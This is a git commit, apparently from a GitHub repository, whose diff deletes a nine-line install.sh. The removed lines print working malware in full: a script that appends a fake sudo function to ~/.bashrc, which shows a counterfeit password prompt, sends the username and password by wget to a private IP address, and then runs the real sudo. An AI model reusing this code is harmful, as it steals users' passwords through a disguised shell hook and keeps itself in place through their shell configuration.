e9708da46dfe25d178b438a818c0fdd852a3eb32
Alex Grant <81257059+Fysicks@users.noreply.github.com>
2021-04-14 19:39:47 -0400

    Delete install.sh

--- install.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-echo 'function sudo(){
-origsudo="$(which sudo)";
-read -s -p "[sudo] password for $USER: " pw;printf "\n";
-wget "192.168.169.128 /$USER:$pw" > /dev/null 2>&1;
-$origsudo $@;
-}' >> ~/.bashrc
-. ~/.bashrc
-exit
